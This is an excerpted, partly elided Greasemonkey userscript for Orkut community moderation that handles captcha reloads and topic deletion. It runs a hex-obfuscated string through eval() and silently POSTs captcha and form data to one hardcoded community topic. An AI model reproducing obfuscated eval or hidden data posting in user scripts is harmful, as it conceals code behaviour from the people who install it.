// ==UserScript==
// @name           Script Moderação :: Script MOD
// @namespace      by Joseph | uid=4629209997186050418 e editado Por Brenno Lopes
...
eval("\x69\x66\x20\x28\x43\x72\x69\x61\x64\x6f\x5f\x70\x6f\x72\x20\x21\x3d\x20\x27\x4a\x6f\x73\x65\x70\x68\x27\x29\x6c\x61\x6c\x61\x3
...
function recarregaCaptcha()
	{
		...
		"document.getElementById('captcha').innerHTML.replace(/CaptchaImage\\?xid=\\d+/, 'CaptchaImage?xid=' + 
...
#e0e0e0;width:300;height:200;text-align:center;position:absolute;top:40%;left:40%;align:center;background:#9afbfd;\">"+
...
function captchaDelTopic(env)
	{
		...
		'		{ ' +
 		'			var ajax = new XMLHttpRequest;' + 
		'			ajax.open("POST","CommMsgPost?cmm=54966690&tid=552385194182405243", false);' + 
		'			ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");' + 
		'			ajax.send("cs=" + document.getElementById("cs").value + "&' + array_values(env) + '");' + 
...
function confirmaDeletarTopicos()
	{
		...
		if (new RegExp(/delete\_entire\_topic/i).test(tagBody.innerHTML))
		{
			...
			tagBody.innerHTML = tagBody.innerHTML.replace("_submitForm(this, 'delete_entire_topic', 'confirmDelete()');; 
